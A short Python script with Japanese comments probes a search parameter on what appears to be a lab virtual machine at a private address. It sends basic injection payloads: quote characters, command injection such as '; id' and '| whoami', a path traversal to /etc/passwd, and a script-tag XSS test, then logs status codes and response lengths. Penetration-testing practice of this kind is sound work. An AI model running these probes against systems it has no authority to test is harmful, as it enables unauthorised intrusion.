import requests
import time

# ターゲットのURL
url = "http://192.168.56.109/kzMb5nVYJw/420search.php"

# 検証したいペイロード（攻撃コード）のリスト
payloads = [
    "'",
    '"',
    "'; id",
    "| whoami",
    "../../../../etc/passwd",
    "<script>alert(1)</script>"
]

print("検証開始")

for payload in payloads:
    # URLパラメータ（クエリストリング）を設定
    params = {"usrtosearch": payload}
    
    try:
        # GETリクエストを送信
        response = requests.get(url, params=params, timeout=5)
        
        # 正常なレスポンス（何も入れてない時）との違いを比較するために出力
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        print("-" * 30)
        
        # サーバーに負荷をかけないよう少し待機（エチケットとして超重要です！）
        time.sleep(1)
        
    except requests.exceptions.RequestException as e:
        print(f"通信エラーが発生しました: {e}")